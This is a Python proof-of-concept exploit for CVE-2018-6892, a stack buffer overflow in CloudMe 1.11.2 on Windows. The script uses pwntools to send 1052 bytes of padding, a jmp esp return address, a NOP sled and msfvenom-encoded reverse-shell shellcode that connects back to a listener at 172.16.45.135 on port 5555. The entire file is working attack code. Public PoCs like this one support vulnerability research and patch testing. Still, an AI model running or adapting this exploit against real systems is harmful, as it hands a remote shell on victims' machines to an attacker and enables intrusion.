#!/usr/bin/python3

#   Author : Lorenzo Invidia
#   PoC for CVE-2018-6892
#   Tested on Windows 10 1909 (DEP disabled)
#   Version: CloudMe 1.11.2
#   Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe


from pwn import *

context(os='windows', arch='i386')

host = '127.0.0.1'
port = 8888

p = remote(host, port)

# 0x0040d7ed jmp esp ffe4
gg = p32(0x0040d7ed)

offset_eip = 1052

nops = b"\x90"*60

# msfvenom -p windows/shell_reverse_tcp --encoder x86/shikata_ga_nai --arch x86 LHOST="172.16.45.135" LPORT=5555 -f python --platform windows
buf =  b""
buf += b"\xbe\xc1\xf1\x6e\xa1\xd9\xec\xd9\x74\x24\xf4\x5a\x2b"
buf += b"\xc9\xb1\x52\x31\x72\x12\x83\xc2\x04\x03\xb3\xff\x8c"
buf += b"\x54\xcf\xe8\xd3\x97\x2f\xe9\xb3\x1e\xca\xd8\xf3\x45"
buf += b"\x9f\x4b\xc4\x0e\xcd\x67\xaf\x43\xe5\xfc\xdd\x4b\x0a"
buf += b"\xb4\x68\xaa\x25\x45\xc0\x8e\x24\xc5\x1b\xc3\x86\xf4"
buf += b"\xd3\x16\xc7\x31\x09\xda\x95\xea\x45\x49\x09\x9e\x10"
buf += b"\x52\xa2\xec\xb5\xd2\x57\xa4\xb4\xf3\xc6\xbe\xee\xd3"
buf += b"\xe9\x13\x9b\x5d\xf1\x70\xa6\x14\x8a\x43\x5c\xa7\x5a"
buf += b"\x9a\x9d\x04\xa3\x12\x6c\x54\xe4\x95\x8f\x23\x1c\xe6"
buf += b"\x32\x34\xdb\x94\xe8\xb1\xff\x3f\x7a\x61\xdb\xbe\xaf"
buf += b"\xf4\xa8\xcd\x04\x72\xf6\xd1\x9b\x57\x8d\xee\x10\x56"
buf += b"\x41\x67\x62\x7d\x45\x23\x30\x1c\xdc\x89\x97\x21\x3e"
buf += b"\x72\x47\x84\x35\x9f\x9c\xb5\x14\xc8\x51\xf4\xa6\x08"
buf += b"\xfe\x8f\xd5\x3a\xa1\x3b\x71\x77\x2a\xe2\x86\x78\x01"
buf += b"\x52\x18\x87\xaa\xa3\x31\x4c\xfe\xf3\x29\x65\x7f\x98"
buf += b"\xa9\x8a\xaa\x0f\xf9\x24\x05\xf0\xa9\x84\xf5\x98\xa3"
buf += b"\x0a\x29\xb8\xcc\xc0\x42\x53\x37\x83\xc0\xb4\x1a\xd4"
buf += b"\x71\xb7\x64\xcf\x32\x3e\x82\x85\x24\x17\x1d\x32\xdc"
buf += b"\x32\xd5\xa3\x21\xe9\x90\xe4\xaa\x1e\x65\xaa\x5a\x6a"
buf += b"\x75\x5b\xab\x21\x27\xca\xb4\x9f\x4f\x90\x27\x44\x8f"
buf += b"\xdf\x5b\xd3\xd8\x88\xaa\x2a\x8c\x24\x94\x84\xb2\xb4"
buf += b"\x40\xee\x76\x63\xb1\xf1\x77\xe6\x8d\xd5\x67\x3e\x0d"
buf += b"\x52\xd3\xee\x58\x0c\x8d\x48\x33\xfe\x67\x03\xe8\xa8"
buf += b"\xef\xd2\xc2\x6a\x69\xdb\x0e\x1d\x95\x6a\xe7\x58\xaa"
buf += b"\x43\x6f\x6d\xd3\xb9\x0f\x92\x0e\x7a\x3f\xd9\x12\x2b"
buf += b"\xa8\x84\xc7\x69\xb5\x36\x32\xad\xc0\xb4\xb6\x4e\x37"
buf += b"\xa4\xb3\x4b\x73\x62\x28\x26\xec\x07\x4e\x95\x0d\x02"

padding = b"A"*offset_eip 
payload = padding + gg + nops + buf

p.send(payload)